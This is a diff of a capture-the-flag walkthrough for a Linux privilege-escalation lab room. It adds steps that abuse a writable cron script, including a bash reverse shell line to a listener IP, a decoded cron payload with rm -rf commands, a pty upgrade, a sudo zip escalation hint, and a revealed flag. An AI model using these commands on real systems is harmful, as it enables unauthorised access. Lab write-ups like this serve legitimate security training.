@@ -1,4 +1,4 @@
-<p>June 25, 2025</p>
+![image](https://github.com/user-attachments/assets/11c9a09d-13f0-45b1-b70f-ebbf55560625)![image](https://github.com/user-attachments/assets/11c9a09d-13f0-45b1-b70f-ebbf55560625)<p>June 25, 2025</p>
 <h1>Linux Agency</h1>
 <p>This Room will help you to sharpen your Linux Skills and help you to learn basic privilege escalation in a HITMAN theme. So, pack your briefcase and grab your SilverBallers as its gonna be a tough ride.</p>
 
@@ -584,18 +584,112 @@ viktor@linuxagency:~$
 ```
 
 <p>4.2. What is dalia's flag?<br>
-<code>______</code></p>
+<code>dalia{4a94a7a7bb4a819a63a33979926c77dc}</code></p>
 
 ```bash
+viktor@linuxagency:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
 
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *	* * *	dalia	sleep 30;/opt/scripts/47.sh
+*  *	* * *	root	echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
+#
+viktor@linuxagency:~$ echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d
+#!/bin/bash
+#echo "Hello 47"
+rm -rf /dev/shm/
+#echo "Here time is a great matter of essence"
+rm -rf /tmp/
+viktor@linuxagency:~$ 
 ```
+
+<p>edited <code>47.sh</code></p>
+
+```bash
+viktor@linuxagency:/opt/scripts$ nano 47.sh
+```
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.87.142/4444 0>&1 
+```
+
+<p>set up a listener</p>
+
+```bash
+:~# nc -nlvp 4444
+```
+
+<p>saved <code>47.sh</code></p>
+
+```bash
+:~# nc -nlvp 4444
+...
+dalia@linuxagency:~$ which python3
+which python3
+/usr/bin/python3
+dalia@linuxagency:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+dalia@linuxagency:~$ ^Z
+[1]+  Stopped                 nc -nlvp 4444
+:~# stty raw -echo; fg
+nc -nlvp 4444
+
+dalia@linuxagency:~$ pwd
+pwd
+/home/dalia
+dalia@linuxagency:~$ ls
+ls
+examples.desktop
+flag.txt
+dalia@linuxagency:~$ cat flag.txt
+cat flag.txt
+dalia{4a94a7a7bb4a819a63a33979926c77dc}
+```
+
+<p></p>
 
 <p>4.3. What is silvio's flag?<br>
 <code>______</code></p>
 
 ```bash
+dalia@linuxagency:~$ sudo -l
+Matching Defaults entries for dalia on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User dalia may run the following commands on linuxagency:
+    (silvio) NOPASSWD: /usr/bin/zip
+dalia@linuxagency:~$ sudo -l -l
+Matching Defaults entries for dalia on linuxagency:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dalia may run the following commands on linuxagency:
+
+Sudoers entry:
+    RunAsUsers: silvio
+    Options: !authenticate
+    Commands:
+	/usr/bin/zip
+dalia@linuxagency:~$ 
 ```
+
+<p>GTFObins</p>
+
+![image](https://github.com/user-attachments/assets/68782721-173d-42e4-8de0-d93c2cd6b83c)
+
 
 <p>4.4. What is reza's flag?<br>
 <code>______</code></p>
